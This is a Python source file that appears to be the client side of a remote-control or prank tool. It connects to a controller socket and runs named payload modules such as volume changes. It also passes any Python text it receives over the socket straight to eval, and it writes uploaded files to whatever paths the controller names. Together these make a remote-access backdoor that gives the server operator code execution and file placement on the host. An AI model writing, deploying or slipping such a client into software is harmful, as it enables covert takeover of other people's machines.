from threading import Thread
from socketHelpers.client import Client
from socketHelpers.packet import Packet

import os
import time

import payloads.test
import payloads.minvolume
import payloads.maxvolume

paylds = [payloads.test, payloads.minvolume, payloads.maxvolume]
PAYLOADS = {str(x.__name__).split(".")[1]:x for x in paylds}


class PayloadPlayer(Thread):
    def __init__(self, payload, manager=None):
        super().__init__()
        self.payload = payload
        self.running = False
        self.manager = manager
        self.starttime = 0

    def __repr__(self):
        t = time.strftime("%j %H:%M:%S", time.gmtime( time.time() - (time.time() if self.starttime == 0 else self.starttime) )).split(" ")
        return "PayloadPlayer(%s, %s days %s)"%(self.payload.__name__, int(t[0])-1, t[1])

    def run(self):
        self.starttime = time.time()
        self.running = True
        if self.manager : self.manager.activePayloads[self.payload.__name__.split(".")[1]] = self
        self.payload.execute(self)
        self.running = False

    def kill(self):
        self.running = False

    def execute(self):
        if self.payload.RETURNS: return self.payload.execute(self)
        self.start()

        return "Started execution of '%s'."%self.payload



class Client(Client):
    activePayloads = {}
    file_buffer = ""

    def handle(self, packet):
        if packet.get_id() == "execute_list":
            self.send(Packet("execute", str(list(PAYLOADS.keys()))))

        if packet.get_id() == "execute":
            try:
                data = PayloadPlayer(PAYLOADS[packet.read()], self).execute()
            except KeyError:
                self.send(Packet("info", "Can not find payload %s."%packet.read()))
            else:
                self.send(Packet("info", data))

        if packet.get_id() == "cmd":
            try:
                data = eval(packet.read())
            except Exception as e:
                data = "%s: %s"%(type(e), e)

            self.send(Packet("info", str(data)))

        if packet.get_id() == "new_file":
            name = packet.read()
            self.file_buffer = name

            os.makedirs("." if os.path.dirname(name) == "" else os.path.dirname(name), exist_ok=True)
            with open(name, "w") as f:
                f.close()

            self.send(Packet("info", "Recieving file '%s'."%name))

        if packet.get_id() == "file_data":
            data = packet.read_raw()

            with open(self.file_buffer, "ab") as f:
                f.write(data)
                f.close()

        if packet.get_id() == "cleaner":
            for i in self.activePayloads:
                self.activePayloads[i].kill()

        if packet.get_id() == "active":
            self.send(Packet("active", str(self.activePayloads)))

        if packet.get_id() == "paykill":
            try:
                self.activePayloads[packet.read()].kill()
            except KeyError:
                self.send(Packet("info", "Can not find payload %s."%packet.read()))
            else:
                self.send(Packet("info", "Killed payload."))


c = Client("localhost", 2000)
c.start()
